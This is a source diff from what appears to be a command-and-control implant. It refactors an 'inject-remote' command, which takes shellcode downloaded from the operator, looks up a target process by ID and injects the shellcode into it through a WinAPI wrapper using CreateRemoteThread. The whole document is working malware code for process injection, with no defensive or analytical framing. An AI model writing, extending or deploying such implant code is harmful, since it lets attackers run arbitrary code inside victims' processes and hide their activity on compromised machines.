@@ -1,5 +1,4 @@
-﻿using Agent.Internal;
-using Agent.Models;
+﻿using Agent.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -8,6 +7,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using WinAPI.Wrapper;
 
 namespace Agent.Commands
 {
@@ -15,42 +15,33 @@ namespace Agent.Commands
     {
         public override string Name => "inject-remote";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            if (task.SplittedArgs.Length < 1)
-            {
-                result.Result = $"Usage: {this.Name} ProcessId";
-                return;
-            }
+            this.CheckFileDownloaded(task, context);
 
-            var fileName = task.FileId;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
-
-            this.Notify(result, commm, $"{fileName} Downloaded");
-
-            var shellcode = fileContent;
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var shellcode = file.GetFileContent();
 
             int processId = int.Parse(task.SplittedArgs[0]);
 
             var process = Process.GetProcessById(processId);
-            if(process == null)
+            if (process == null)
             {
-                result.Result = $"Unable to find process with Id {processId}";
+                context.Result.Result = $"Unable to find process with Id {processId}";
                 return;
             }
 
-            var injectRes = Injector.Inject(process, shellcode);
-            if (!injectRes.Succeed)
-                result.Result += $"Injection failed : {injectRes.Error}";
-            else
+            var winAPI = WinAPIWrapper.CreateInstance();
+
+            try
             {
-                result.Result += $"Injection succeed!" + Environment.NewLine;
-                if (!string.IsNullOrEmpty(injectRes.Output))
-                    result.Result += injectRes.Output;
+                winAPI.Inject(process.Handle, IntPtr.Zero, shellcode, InjectionMethod.CreateRemoteThread);
+                context.AppendResult($"Injection succeed!");
+            }
+            catch(Exception ex)
+            {
+                context.Error($"Injection failed : {ex}");
+                return;
             }
         }
     }
